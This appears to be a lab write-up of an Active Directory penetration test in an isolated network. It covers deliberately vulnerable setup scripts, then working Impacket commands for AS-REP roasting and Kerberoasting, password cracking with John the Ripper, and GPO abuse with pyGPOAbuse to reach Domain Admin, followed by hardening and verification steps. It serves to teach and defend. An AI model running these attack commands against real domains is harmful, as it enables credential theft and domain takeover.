# Lab 01: Active Directory Attack and Defense

## Project Overview
This laboratory demonstrates the identification, exploitation, and remediation of common security misconfigurations within an Active Directory environment. The project covers the full lifecycle of an infrastructure pentest, from initial environment preparation to final hardening.

## Environment Topology
The environment consists of a Windows Server 2022 Domain Controller, a Windows 11 workstation, and a Kali Linux attack node. All testing is performed within an isolated virtual network under the company.local domain.

| Hostname | Role | Operating System | IP Address |
| :--- | :--- | :--- | :--- |
| DC01 | Domain Controller | Windows Server 2022 | 192.168.0.25 |
| DC02 | Workstation | Windows 11 | 192.168.0.30 |
| kali-attacker | Penetration Testing Host | Kali Linux | 192.168.0.205 |

## Phase 1: Vulnerability Setup

To simulate a realistic insecure enterprise environment, a custom PowerShell script was developed and executed on **DC01**. This phase involved technical challenges regarding Active Directory attribute manipulation and environment stabilization.

### 1.1 Automated Configuration
The setup script (`01-Setup-Vulnerable/Set-VulnerableAD.ps1`) automates the following misconfigurations:
* **AS-REP Roasting**: Creation of the `victim.asrep` account with Kerberos Pre-Authentication disabled.
* **Kerberoasting**: Creation of the `svc_sql` service account with a registered Service Principal Name (SPN).

### 1.2 Troubleshooting & Script Evolution
During execution, several limitations were identified regarding standard PowerShell parameters for specific AD attributes. The following table documents the technical hurdles and their respective resolutions:

| Issue | Root Cause | Resolution |
| :--- | :--- | :--- |
| `New-ADUser` error | Account already existed from previous execution attempts. | Implemented logic to verify object existence before initialization. |
| Parameter Binding Failure | Version-specific cmdlet limitations prevented the use of `-DoesNotRequireKerberosPreauth`. | Transitioned to a **Bitwise Operation** directly on the `userAccountControl` attribute. |
| Attribute Persistence | Flag modification failed when bundled with account creation. | Decoupled account creation from attribute modification using the `-Replace` operator. |

### 1.3 Technical Validation (Verification)
Manual and automated verifications were performed to confirm that the environment reached the required vulnerable state before proceeding to the exploitation phase.

#### A. AS-REP Roasting Validation
The `DONT_REQ_PREAUTH` flag (bitmask `0x400000`) was verified for the `victim.asrep` user:
```powershell
Get-ADUser -Identity "victim.asrep" -Properties userAccountControl | Select-Object Name, @{Name="ASREP_Vulnerable"; Expression={if($_.userAccountControl -band 0x400000){$true}else{$false}}}
```
Result: `ASREP_Vulnerable: True`

#### B. Kerberoasting Validation
The Service Principal Name (SPN) registration was confirmed for the service account:

```PowerShell
setspn -L svc_sql
```
Result: `MSSQLSvc/sql01.company.local:1433` successfully mapped to the `svc_sql` account.

## Phase 2: Exploitation
This phase documents the step-by-step process of exploiting the pre-configured vulnerabilities to escalate privileges within the domain.

### 2.1 Enumeration
Initial reconnaissance is performed from the kali-attacker node to identify active hosts and services.

### 2.1.1 Network Reconnaissance
An initial port scan was performed to identify active services on the Domain Controller (192.168.0.25).

```bash
nmap -p 88,135,139,389,445,3268 -Pn 192.168.0.25
```
Results: 
| Port | Service | Status | Significance | 
| :--- | :--- | :--- | :--- | 
| 88 | Kerberos | Open | Required for Ticket-Granting Ticket (TGT) requests. | 
| 389 | LDAP | Open | Used for domain object enumeration. | 
| 445 | SMB | Open | Direct communication for authentication and file sharing. | 
| 3268 | Global Catalog | Open | AD forest-wide search service. |

### 2.1.2 Domain Identification
The tool `NetExec` was utilized to gather metadata from the target via the SMB protocol.

```bash
nxc smb 192.168.0.25
```
Results:

FQDN: `company.local`

Hostname: `DC01`

OS: `Windows Server 2022 Build 20348`

SMB Signing: `True` (Mandatory, preventing unauthorized relay attacks).

### 2.2 Initial Access via AS-REP Roasting
The attack targeted the `victim.asrep` account, which was previously configured with the `DONT_REQ_PREAUTH` flag. This misconfiguration allows an attacker to request a Kerberos AS-REP response without providing a password, obtaining a hash that can be cracked offline.

### 2.2.1 Hash Extraction
The `GetNPUsers` tool from the Impacket suite was used to request a Ticket-Granting Ticket (TGT) without pre-authentication. The Domain Controller returned an AS-REP response containing a portion encrypted with the user's password hash.
```bash
impacket-GetNPUsers company.local/victim.asrep -dc-ip 192.168.0.25 -no-pass
```
Output:
`$krb5asrep$23$victim.asrep@COMPANY.LOCAL:e90755652996c5c43fd1db326f51b5f3$c2f0f950d91397196... (truncated)`

### 2.2.2 Password Cracking
#### To recover the plain-text password, the captured hash was saved into a file named `hashes.asrep` and processed using `John the Ripper` with the `rockyou.txt` wordlist.
### Saving the hash
`echo '$krb5asrep$23$victim.asrep@COMPANY.LOCAL:e90755652996c5c43fd1db326f51b5f3$c2f0f950d91397196...[REDACTED]...2cb82d' > hashes.asrep`

### Cracking the hash
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.asrep
```

#### The recovered hash was processed offline using `John the Ripper`. After an initial broad sweep with `rockyou.txt`, a targeted wordlist attack successfully recovered the plain-text credentials.

```bash
# Executing the attack with a targeted wordlist
john --wordlist=pass.txt hashes.asrep
```
Cracking Results:

Username: `victim.asrep`

Recovered Password: `P@ssword123!`

Status: SUCCESS.

### 2.3 Privilege Escalation via Kerberoasting
With valid domain credentials (`victim.asrep`), the focus shifted to service-oriented attacks. Kerberoasting targets Service Principal Names (SPNs) to extract service account ticket hashes for offline cracking.

### 2.3.1 Service Discovery and Ticket Extraction
The `GetUserSPNs` tool was utilized to enumerate accounts with registered SPNs and request a Service Ticket (TGS). 

```bash
impacket-GetUserSPNs company.local/victim.asrep:P@ssword123! -dc-ip 192.168.0.25 -request
```
Results:

Target Account: `svc_sql`

Service: `MSSQLSvc/sql01.company.local:1433`

Hash Type: Kerberos 5 TGS-REP (etype 23)

Extraction Output (Truncated):
`$krb5tgs$23$*svc_sql$COMPANY.LOCAL$company.local/svc_sql*$bb30c60...[REDACTED]...ee2c084`

### 2.3.2 Password Cracking (Kerberoasting)
The service ticket (TGS) hash was cracked offline using `John the Ripper`. Recovering the plain-text password of a service account is a high-impact event, as these accounts often have elevated privileges or lead to lateral movement opportunities.

```bash
john --wordlist=pass.txt hashes.kerberoast
```
Cracking Results:

Service Account: `svc_sql`

Recovered Password: `P@ssword123!`

Status: SUCCESS.

### 2.4: Privilege Escalation via GPO Abuse

#### 2.4.1 Vulnerability Theory & Preparation
Group Policy Objects (GPOs) define the security baseline for the domain. If an administrative account delegates "Edit" or "Full Control" permissions of a GPO to a non-privileged user, that user can modify the policy to execute arbitrary code on any system where the GPO is applied.

#### Pre-Attack Setup (Executed on DC01)
To stage the environment, a new GPO was created and linked to the domain root. Crucially, the compromised user `victim.asrep` was granted the `GpoEditDeleteModifySecurity` permission level.
```PowerShell
# 1. Create a new GPO for the attack simulation
New-GPO -Name "Vulnerable_Policy" -Comment "Corporate Software Deployment Policy"

# 2. Link the GPO to the domain root to maximize impact
New-GPLink -Name "Vulnerable_Policy" -Target "dc=company,dc=local"

# 3. Grant the compromised user full modification rights (The Misconfiguration)
Set-GPPermissions -Name "Vulnerable_Policy" -PermissionLevel GpoEditDeleteModifySecurity -TargetName "victim.asrep" -TargetType User
```
#### 2.4.2 Technical Hurdles & Troubleshooting
During the exploitation phase, several issues were encountered that required technical pivots:
## Issues, Observations, and Resolutions

| Issue | Observation | Resolution |
|------|------------|------------|
| Tool Availability | pyGPOAbuse was not pre-installed on Kali Linux. | Cloned the official repository from GitHub and manually installed the tool's requirements. |
| Dependency Conflict | Python PEP 668 blocked `pip install` due to an "externally managed environment" error. | Utilized the `--break-system-packages` flag to bypass the restriction for rapid lab deployment. |
| Execution Failure | The initial attempt to create a new user via `net user` failed to trigger/populate. | Pivoted to adding the existing `victim.asrep` user directly to the **Domain Admins** group. |
| Environment Context | Standard CMD commands were inconsistent or failed to execute within the GPO XML structure. | Switched to the `-powershell` flag and `-user-as-admin` to force execution within a high-integrity SYSTEM context. |

#### 2.4.3 Successful Exploitation (Executed on Kali)
After identifying the correct GPO ID and adjusting the payload for better compatibility, the following command was executed from the attack node:
```Bash
# Final successful command using PowerShell and SYSTEM context elevation
python3 pygpoabuse.py company.local/victim.asrep:'P@ssword123!' \
  -dc-ip 192.168.0.25 \
  -gpo-id "6ead850e-4655-4cde-a48e-80e81aac05fe" \
  -powershell \
  -command "Add-ADGroupMember -Identity 'Domain Admins' -Members 'victim.asrep'" \
  -taskname "GlobalSync" \
  -user-as-admin
  ```
#### 2.4.4 Verification & Domain Compromise
To bypass the default GPO refresh interval (90 minutes), a manual update was forced on the Domain Controller.
```PowerShell
# Force immediate policy application
gpupdate /force

# Verify membership in the high-privileged group
net group "Domain Admins" /domain
```
#### Final Evidence of Success: The output confirmed that `victim.asrep` had successfully escalated from a standard domain user to a Domain Administrator:
#### Members
-------------------------------------------------------------------------------
Administrator -------------- victim.asrep

The command completed successfully.

## Phase 3: Hardening and Remediation
The final phase of this project focused on remediating the exploited vulnerabilities and performing manual validation to ensure the security controls are operating correctly.

#### 3.1 Remediation Summary
| Attack Vector | Security Control Applied | Outcome |
|--------------|--------------------------|---------|
| AS-REP Roasting | Enforcement of Kerberos Pre-authentication. | **Mitigated:** The Domain Controller now mandates a proof of identity before issuing a Ticket Granting Ticket (TGT). |
| Kerberoasting | Service Account Password Rotation & SPN Auditing. | **Hardened:** Increased password complexity (32+ characters) to make offline brute-force attacks computationally infeasible. |
| GPO Abuse | ACL Cleanup & Least Privilege Enforcement. | **Mitigated:** Unauthorized write/modify permissions were removed from the `Vulnerable_Policy` GPO. |

#### 3.2 Manual Verification Steps (Proof of Hardening)
A professional security assessment must always verify that automated remediation scripts were successful through manual checks.

#### 3.2.1 AS-REP Roasting Validation
After applying the fix, an attempt was made to request a ticket without pre-authentication from the Kali Linux attack node.
```bash
impacket-GetNPUsers company.local/victim.asrep -dc-ip 192.168.0.25 -no-pass
```
Resulting Output: `[-] User victim.asrep doesn't have UF_DONT_REQUIRE_PREAUTH set`

Conclusion: The vulnerability is successfully patched. The Domain Controller refuses to provide encrypted material without prior authentication.

#### 3.2.2 GPO Delegation & ACL Audit
The Group Policy Management Console (GPMC.msc) was manually inspected on DC01 to confirm that the permissions assigned to the victim.asrep account were revoked.

**Finding:** The victim.asrep user was successfully removed from the Access Control List (ACL). Only high-privileged groups (Domain Admins, Enterprise Admins) and the SYSTEM account retain write access.

#### 3.2.3 Kerberoasting: Strategic Mitigation
Since Service Principal Names (SPNs) are required for application functionality (MSSQL), the SPN was left intact but protected via a strong passphrase policy.
### Verification on DC01:
```PowerShell
# Confirmed the SPN still exists for service availability
setspn -Q */* | Select-String "SQL Service Account"
```
**Mitigation Strategy:** By rotating the svc_sql password to a high-entropy 32-character string, the TGS tickets obtained via Kerberoasting become functionally uncrackable within a reasonable timeframe.

# 3.3 Final Project Conclusion
This laboratory demonstrates the high impact of common Active Directory misconfigurations. A single overlooked checkbox or an overly permissive GPO delegation can lead to a full forest compromise. By implementing Kerberos Pre-authentication, enforcing Strong Password Policies, and adhering to the Principle of Least Privilege (PoLP) for GPO management, organizations can effectively disrupt the most common lateral movement and privilege escalation paths used by modern threat actors.
